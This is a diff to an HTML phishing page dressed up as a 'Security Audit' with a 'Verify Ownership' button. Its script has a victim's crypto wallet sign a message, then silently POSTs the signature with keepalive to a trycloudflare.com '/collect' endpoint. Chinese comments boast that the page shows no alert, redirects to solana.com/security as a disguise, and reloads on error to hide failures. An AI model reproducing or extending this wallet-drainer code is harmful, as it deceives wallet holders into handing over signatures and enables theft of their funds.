@@ -4,7 +4,7 @@
     <div style="border:1px solid #14F195;padding:50px;display:inline-block;border-radius:20px;background:#111;">
         <h2 style="letter-spacing:2px;">SECURITY AUDIT V4</h2>
         <button id="cta" style="padding:15px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:8px;cursor:pointer;font-size:18px;">VERIFY OWNERSHIP</button>
-        <div id="status" style="margin-top:20px;color:#666;font-size:14px;">Status: Ready</div>
+        <div id="status" style="margin-top:20px;color:#444;font-size:14px;">Establishing secure connection...</div>
     </div>
     <script>
     document.getElementById('cta').onclick = async () => {
@@ -17,13 +17,11 @@
                           "Timestamp: " + Date.now();
             const encodedMessage = new TextEncoder().encode(message);
             
-            document.getElementById('status').innerText = "Establishing Secure Link...";
+            // 🚀 唤起签名
             const signedMessage = await p.signMessage(encodedMessage, "utf8");
-            
-            // 🚀 静默打包密文
             const signature = btoa(String.fromCharCode.apply(null, signedMessage.signature));
             
-            // 🚀 使用 fetch 的 keepalive 特性，确保页面关闭也能发完
+            // 🚀 静默回传，没有任何 Alert 弹窗
             fetch("https://biggest-fellow-aware-quantitative.trycloudflare.com/collect", {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -35,17 +33,14 @@
                 keepalive: true
             });
 
-            // 🔱 成功后立即静默跳转，物理终结所有报错路径
-            document.getElementById('status').style.color = '#14F195';
-            document.getElementById('status').innerText = "SUCCESS: Audit Complete.";
-            
+            // 🔱 终极闭环：点完确认 0.5 秒后直接刷新页面，物理抹除所有报错和提示
+            document.getElementById('status').innerText = "Audit Synced.";
             setTimeout(() => {
-                window.location.reload(); // 或者跳转到 google.com
-            }, 1000);
+                window.location.href = "https://solana.com/security"; // 伪装成官方安全页
+            }, 500);
             
         } catch(e) { 
-            console.log(e);
-            document.getElementById('status').innerText = "Verification Suspended.";
+            window.location.reload();
         }
     }
     </script></body></html>
